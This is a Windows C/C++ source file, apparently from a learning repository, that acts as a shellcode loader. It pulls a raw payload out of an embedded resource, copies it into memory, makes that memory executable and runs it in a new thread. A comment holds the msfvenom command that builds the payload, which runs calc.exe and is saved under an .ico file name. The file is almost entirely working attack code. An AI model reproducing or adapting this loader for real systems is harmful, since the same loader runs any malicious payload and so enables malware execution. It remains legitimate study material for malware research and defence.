#include <windows.h>
#include <stdio.h>
#include "..\utils\utility.h"
#include "..\utils\resources.h"

// g++ -m64  -o injectCurrentProcessRsc.exe injectCurrentProcessRsc.cpp ../utils/resources.o
int main(int argc, char const *argv[])
{
    DWORD   oldProtection;
    HRSRC   res;
    HGLOBAL resLoaded;
    HANDLE  threadHandle;
    LPVOID  resAddr;
    LPVOID  func;
    size_t  resSize;
  
// msfvenom -p windows/x64/exec CMD="calc.exe" EXITFUNC=thread
// --platform windows -a x64 -b "\x00\x0a\x0d" -f raw -o calc.ico

    res = FindResource(NULL, MAKEINTRESOURCE(RSC), RT_RCDATA);
    if (res == NULL){
        MESSAGE(FAIL, "Impossible to find resource\n");
        PRINT_ERROR(FindResource);
        return EXIT_FAILURE;
    }
    MESSAGE(OKAY, "Resource found\n");

    resLoaded = LoadResource(NULL, res);
    if (resLoaded == NULL){
        MESSAGE(FAIL, "Impossible to load resource\n");
        PRINT_ERROR(LoadResource);
        return EXIT_FAILURE;
    }
    MESSAGE(OKAY, "Resource loaded\n");
    
    resAddr = LockResource(resLoaded);
    if (resAddr == NULL){
        MESSAGE(FAIL, "Impossible to lock resource\n");
        PRINT_ERROR(lockResource);
        return EXIT_FAILURE;
    }
    MESSAGE(OKAY, "Resource locked address: 0x%p\n", resAddr);

    resSize = SizeofResource(NULL, res);
    MESSAGE(INFO, "Size of resource: %ld bytes\n", resSize);

    func = VirtualAlloc(0, resSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    RtlMoveMemory(func, resAddr, resSize);
    if (VirtualProtect(func, resSize, PAGE_EXECUTE_READWRITE, &oldProtection) == 0){
        MESSAGE(FAIL, "Impossible to change the protection of the allocated space in the current process\n");
        PRINT_ERROR(VirtualProtect);
        return EXIT_FAILURE;
    }
    MESSAGE(OKAY, "Permission changed successfully address: 0x%p\n", func);
    MESSAGE(INFO, "Press <enter> to continue...");
    getchar();
    //((void(*)())func)();
    threadHandle = CreateThread(NULL, resSize, (LPTHREAD_START_ROUTINE)func, NULL, 0, NULL);
    if ( threadHandle == NULL){
        MESSAGE(FAIL, "Impossible to create thread\n");
        PRINT_ERROR(CreateThread);
        return EXIT_FAILURE;
    }
    MESSAGE(OKAY, "Thread started\n");
    WaitForSingleObject(threadHandle, INFINITE);

    return EXIT_SUCCESS;
}
